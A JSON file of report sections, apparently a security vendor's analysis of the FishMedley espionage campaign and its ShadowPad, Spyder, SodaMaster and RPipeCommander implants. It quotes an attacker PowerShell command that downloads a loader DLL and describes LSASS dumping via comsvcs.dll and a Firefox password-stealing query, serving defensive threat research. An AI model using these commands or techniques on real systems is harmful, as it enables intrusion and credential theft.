[
    {
        "title": "initial access",
        "content": "We were unable to identify the initial compromise vectors. For most cases, the attackers seemed to have had privileged access inside the local network, such as domain administrator credentials.\nAt Victim D, the attackers gained access to an admin console and used it to deploy implants on other machines in the local network. It is probable that they first compromised the machine of a sysadmin or security analyst and then stole credentials that allowed them to connect to the console.\nAt Victim F, the implants were delivered usingImpacket, which means that the attackers somehow previously compromised a high-privilege domain account.",
        "phase": "initial access"
    },
    {
        "title": "lateral movement",
        "content": "At Victim F, the operators also used Impacket to move laterally. They gathered information on other local machines and installed implants.\nTable 3 shows that the operators first did some manual reconnaissance usingquser.exe,wmic.exe, andipconfig.exe. Then they tried to get credentials and other secrets bydumpingthe local security authority subsystem service (LSASS) process (PID 944). The PID of the process was obtained viatasklist /svcand the dump was performed usingcomsvcs.dll, which is a known living-off-the-land binary (LOLBIN). Note that it is likely that the attackers executedquser.exeto see whether other users or admins were also logged in, meaning privileged accesses were present in LSASS. According toMicrosoft documentation, to use this command the attacker must have Full Control permission or special access permission.\nThey also saved the registry hivessam.hiveandsystem.hive, which can both contain secrets or credentials.\nFinally, they tried to dump the LSASS process again, using aforloop iterating over the output fromtasklist.exe. We have seen this same code used on other machines, so it is a good idea to block or at least alert on it.\nTable 3. Commands executed via Impacket on a machine at Victim F",
        "phase": "lateral movement"
    },
    {
        "title": "shadowpad",
        "content": "ShadowPad is a well-known and privately sold modular backdoor, known to only be supplied to China-aligned APT groups, includingFishMongerandSparklingGoblin, as documented bySentinelOne. In Operation FishMedley, the attackers used a ShadowPad version packed withScatterBee.\nAt Victim D, the loader was downloaded using the following PowerShell command:\npowershell (new-object System.Net.WebClient).DownloadFile(\"http://<victim's_web_server_IP_address>/Images/menu/log.dll\";\"c:\\users\\public\\log.dll\")\nThis shows that the attackers compromised a web server at the victim's organization to use it as a staging server for their malware.\nAt Victim F, Firefox was used to download the loader, fromhttp://5.188.230[.]47/log.dll. We don't know whether attackers had interactive access to the machine, whether another piece of malware was running in the Firefox process, or whether the victim was redirected to the download page, say via a watering-hole attack.\nlog.dllis side-loaded by an old Bitdefender executable (original name:BDReinit.exe) and loads ShadowPad from a file namedlog.dll.dat, which can be decrypted using the scripts provided in PwC'sGitHubrepository.\nWe did not recover thelog.dll.datfrom the victim's machine, but we found a fake Adobe Flash installer onVirusTotalwith the identicallog.dllfile. The configuration of the ShadowPad payload is provided in Table 4.\nTable 4. ShadowPad configuration\nNote that from March 20th, 2022 to November 2nd, 2022, the C&C domain resolved to213.59.118[.]124, which is mentioned in a VMwareblogpostabout ShadowPad.",
        "phase": "command and control"
    },
    {
        "title": "spyder",
        "content": "At Victim D, we detected another backdoor typically used by FishMonger: Spyder, a modular implant that was analyzed in great detail byDr.Web.\nA Spyder loader was downloaded fromhttp://<a_victim's_web_server_IP_address>/Images/menu/aa.docand dropped toC:\\Users\\Public\\task.exearound 18 hours after ShadowPad was installed.\nThe loader – see Figure 2; reads the filec:\\windows\\temp\\guid.datand decrypts its contents using AES-CBC. The encryption key is hardcoded:F4 E4 C6 9E DE E0 9E 82 00 00 00 00 00 00 00 00. The initialization vector (IV) is the first eight bytes of the key. Unfortunately, we were unable to recover theguid.datfile.\nThen, the loader injects the decoded content – likely shellcode – into itself (task.exeprocess) as seen in Figure 3.\nDespite not obtaining the encrypted final payload, our product did detect a Spyder payload in memory and it was almost identical to the Spyder variant documented by Dr.Web. The C&C server was hardcoded to61.238.103[.]165.\nInterestingly, multiple subdomains ofjunlper[.]com, a known Spyder C&C domain and a weak homoglyph domain tojuniper.net, resolved to61.238.103[.]165in 2022.\nA self-signed TLS certificate was present on port 443 of the server from May to December 2022, with the thumbprint89EDCFFC66EDA3AEB75E140816702F9AC73A75F0. According toSentinelOne, it is a certificate used by FishMonger for its C&C servers.",
        "phase": "command and control"
    },
    {
        "title": "sodamaster",
        "content": "SodaMaster is a backdoor that was documented byKasperskyin 2021. APT10 was the first group known to have access to this backdoor but Operation FishMedley indicates that it may now be shared among multiple China-aligned APT groups.\nSodaMaster can only be found decrypted in memory and that's where we detected it. Even though we did not recover the full loading chain, we have identified a few samples that are the first step of the chain.\nWe found six different malicious DLLs that are abusing legitimate executables viaDLL side-loading. They all implement the same decryption and injection routine.\nFirst, the loader reads a hardcoded file, for exampledebug.png, and XOR decrypts it using a hardcoded 239-byte key. Table 5 summarizes the different loaders. Note that the XOR key is also different in each sample, but too long to be included in the table. Also note that we did not recover any of these encrypted payloads.\nTable 5. SodaMaster loaders\nThen, the decrypted buffer is injected into a newly created, suspendedsvchost.exeprocess – see Figure 4.\nFinally, the shellcode is executed using eitherCreateRemoteThread(on Windows XP or older versions) or, on newer Windows versions, viaNtCreateThreadExas shown in Figure 5.\nThe last four loaders in Table 5 have additional features:\nThey have an export namedgetAllAuthDatathat implements a password stealer for Firefox. It reads the Firefox SQLite database and runs the querySELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins. \nThe last three loaders persist as a service namedNetlock,MsKeyboardFiltersrv, anddownmap, respectively.\nAs mentioned above, the SodaMaster payload was publicly analyzed by Kaspersky and the samples we've found don't seem to have evolved much. They still implement the same four backdoor commands (d,f,l, ands) that were present in 2021.\nTable 6 shows the configurations from the four different SodaMaster payloads that we identified. Operators used a different C&C server per victim, but we can see that Victims B and C share the same hardcoded RSA key.\nTable 6. SodaMaster configuration",
        "phase": "execution"
    },
    {
        "title": "rpipecommander",
        "content": "At Victim D, we captured a previously unknown implant in the same process where Spyder was running. It was probably loaded from disk or downloaded by Spyder. Because its DLL export name wasrcmd64.dll, we named this implant RPipeCommander.\nRPipeCommander is multithreaded and usesIoCompletionPortto manage the I/O requests of the multiple threads. It creates the named pipe\\\\.\\Pipe\\CmdPipe<PID>, where<PID>is the current process ID, and reads from and writes into this pipe.\nRPipeCommander is a reverse shell that accepts three commands via the named pipe:\nh(0x68): create acmd.exeprocess and bind pipes to the process to send commands and read the output. \ni(0x69): Write a command in the existingcmd.exeprocess or read the output of the previous command. \nj(0x6A): exit thecmd.exeprocess by writingexit\\r\\nin the command shell.\nNote that it seems we only have the server side of RPipeCommander. It is likely that a second component, a client, is used to send commands to the server from another machine on the local network.\nFinally, RPipeCommander is written in C++ and RTTI information was included in the captured samples, allowing us to obtain some of the class names:\nCPipeServer \nCPipeBuffer \nCPipeSrvEvent \nCPipeServerEventHandler",
        "phase": "command and control"
    }
]